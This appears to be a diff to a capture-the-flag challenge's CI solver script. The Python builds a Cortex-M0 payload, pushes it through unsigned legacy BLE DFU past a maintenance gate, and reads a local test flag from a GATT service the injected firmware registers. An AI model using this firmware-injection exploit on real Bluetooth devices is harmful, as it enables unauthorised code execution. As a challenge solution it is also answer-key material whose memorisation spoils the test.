@@ -4,7 +4,7 @@
 This file is intentionally excluded from both release ZIPs.  CI copies it into
 the already-verified attachment workspace, then proves that a player script can
 cross the maintenance gate, perform unsigned legacy DFU, execute Thumb code,
-and recover the local test flag through the BLE console.
+register a new GATT service, and recover the local test flag through Rootcanal.
 """
 
 from __future__ import annotations
@@ -21,8 +21,6 @@ from bumble.hci import Address
 from bumble.transport import open_transport
 
 from hitcon_legacy_dfu.protocol import (
-    CONSOLE_OUTPUT_UUID,
-    CONSOLE_SERVICE_UUID,
     CONTROL_POINT_UUID,
     MAINTENANCE_CONTROL_UUID,
     MAINTENANCE_SERVICE_UUID,
@@ -39,7 +37,8 @@ TARGET_ADDRESS = Address("F6:F7:F8:F9:FA:FB")
 MAINTENANCE_REQUEST = bytes.fromhex("11451419198100")
 EXPECTED_LOCAL_FLAG = b"CTF{local_emulator_test_flag}\n"
 GPIO_P0_IN = 0x5000_0510
-UART0_TXD = 0x4000_251C
+EXPLOIT_SERVICE_UUID = "5a1c2001-7c5d-4c8d-942c-a786c1d58b6d"
+EXPLOIT_VALUE_UUID = "5a1c2002-7c5d-4c8d-942c-a786c1d58b6d"
 
 
 def parse_args() -> argparse.Namespace:
@@ -49,36 +48,113 @@ def parse_args() -> argparse.Namespace:
 
 
 def make_flag_payload(bytes_to_read: int) -> bytes:
-    """Build a word-aligned Cortex-M0 image that copies GPIO words to UART."""
+    """Build Cortex-M0 firmware that publishes GPIO words in its own GATT service."""
 
     if bytes_to_read <= 0 or bytes_to_read % 4:
         raise ValueError("bytes_to_read must be a positive multiple of four")
     application_base = 0x0001_B000
     code_offset = 0x100
-    vector_table = struct.pack(
-        "<II",
-        0x2000_8000,
-        application_base + code_offset + 1,
-    )
-    instructions = [0x4800, 0x4A00]
-    for _ in range(bytes_to_read // 4):
-        instructions.extend((0x6801, 0x6011))
-    instructions.append(0xE7FE)
+    code_address = application_base + code_offset
+    flag_buffer = 0x2000_0100
+    uuid_type_output = 0x2000_0080
+    service_handle_output = 0x2000_0082
+    characteristic_handles_output = 0x2000_0084
 
-    encoded = struct.pack(f"<{len(instructions)}H", *instructions)
-    literal_padding = b"\x00\x00" if len(encoded) % 4 else b""
-    literal_address = application_base + code_offset + len(encoded) + len(literal_padding)
-    pc_base = application_base + code_offset + 4
-    instructions[0] |= (literal_address - pc_base) // 4
-    instructions[1] |= (literal_address + 4 - pc_base) // 4
-    encoded = struct.pack(f"<{len(instructions)}H", *instructions)
-    return (
+    instructions: list[int] = []
+    literal_uses: list[tuple[int, int, str]] = []
+
+    def literal(register: int, label: str) -> None:
+        literal_uses.append((len(instructions), register, label))
+        instructions.append(0)
+
+    literal(0, "gpio")
+    literal(1, "flag_buffer")
+    instructions.extend(
+        (0x2200 | (bytes_to_read // 4), 0x6803, 0x600B, 0x3104, 0x3A01, 0xD1FA)
+    )
+    literal(0, "base_uuid")
+    literal(1, "uuid_type_output")
+    instructions.extend((0xDF63, 0x2001))
+    literal(1, "service_uuid")
+    literal(2, "service_handle_output")
+    instructions.append(0xDFA0)
+    literal(0, "service_handle_output")
+    instructions.append(0x8800)
+    literal(1, "char_md")
+    literal(2, "attribute")
+    literal(3, "characteristic_handles_output")
+    instructions.extend((0xDFA2, 0xE7FE))
+
+    code = bytearray(struct.pack(f"<{len(instructions)}H", *instructions))
+    while len(code) % 4:
+        code.extend(b"\x00")
+    literal_pool_offset = code_offset + len(code)
+    labels = (
+        "gpio",
+        "flag_buffer",
+        "base_uuid",
+        "uuid_type_output",
+        "service_uuid",
+        "service_handle_output",
+        "char_md",
+        "attribute",
+        "characteristic_handles_output",
+    )
+    literal_offsets = {
+        label: literal_pool_offset + index * 4 for index, label in enumerate(labels)
+    }
+    data_offset = literal_pool_offset + 4 * len(labels)
+    base_uuid_offset = data_offset
+    service_uuid_offset = base_uuid_offset + 16
+    value_uuid_offset = service_uuid_offset + 4
+    char_md_offset = value_uuid_offset + 4
+    attr_md_offset = char_md_offset + 4
+    attribute_offset = attr_md_offset + 4
+    addresses = {
+        "gpio": GPIO_P0_IN,
+        "flag_buffer": flag_buffer,
+        "base_uuid": application_base + base_uuid_offset,
+        "uuid_type_output": uuid_type_output,
+        "service_uuid": application_base + service_uuid_offset,
+        "service_handle_output": service_handle_output,
+        "char_md": application_base + char_md_offset,
+        "attribute": application_base + attribute_offset,
+        "characteristic_handles_output": characteristic_handles_output,
+    }
+    for label in labels:
+        code.extend(struct.pack("<I", addresses[label]))
+    for index, register, label in literal_uses:
+        instruction_address = code_address + index * 2
+        pc = (instruction_address + 4) & ~3
+        displacement = application_base + literal_offsets[label] - pc
+        struct.pack_into(
+            "<H", code, index * 2, 0x4800 | (register << 8) | (displacement // 4)
+        )
+
+    data = bytearray(bytes.fromhex("6d8bd5c186a72c948d4c5d7c00001c5a"))
+    data.extend(struct.pack("<HBx", 0x2001, 2))
+    data.extend(struct.pack("<HBx", 0x2002, 2))
+    data.extend(b"\x02\x00\x00\x00")
+    data.extend(b"\x01\x00\x00\x00")
+    data.extend(
+        struct.pack(
+            "<IIHHH2xI",
+            application_base + value_uuid_offset,
+            application_base + attr_md_offset,
+            bytes_to_read,
+            0,
+            bytes_to_read,
+            flag_buffer,
+        )
+    )
+    vector_table = struct.pack("<II", 0x2000_8000, code_address + 1)
+    image = (
         vector_table
         + b"\xff" * (code_offset - len(vector_table))
-        + encoded
-        + literal_padding
-        + struct.pack("<II", GPIO_P0_IN, UART0_TXD)
+        + bytes(code)
+        + bytes(data)
     )
+    return image + b"\xff" * (-len(image) % 4)
 
 
 async def reconnect(device: Device, timeout: float = 20.0):
@@ -249,18 +325,18 @@ async def run(args: argparse.Namespace) -> bytes:
             application = await reconnect(device)
             connections.append(application)
             application_peer = Peer(application)
-            console_services = await application_peer.discover_service(
-                UUID(CONSOLE_SERVICE_UUID)
+            exploit_services = await application_peer.discover_service(
+                UUID(EXPLOIT_SERVICE_UUID)
             )
-            if len(console_services) != 1:
-                raise RuntimeError("console service not found after payload reset")
-            await application_peer.discover_characteristics(service=console_services[0])
+            if len(exploit_services) != 1:
+                raise RuntimeError("payload-created service not found after reset")
+            await application_peer.discover_characteristics(service=exploit_services[0])
             output = application_peer.get_characteristics_by_uuid(
-                UUID(CONSOLE_OUTPUT_UUID), console_services[0]
+                UUID(EXPLOIT_VALUE_UUID), exploit_services[0]
             )[0]
             recovered = bytes(await application_peer.read_value(output)).rstrip(b"\x00")
             if recovered != EXPECTED_LOCAL_FLAG:
-                raise RuntimeError(f"unexpected console output: {recovered!r}")
+                raise RuntimeError(f"unexpected payload GATT value: {recovered!r}")
             return recovered
         finally:
             for connection in reversed(connections):
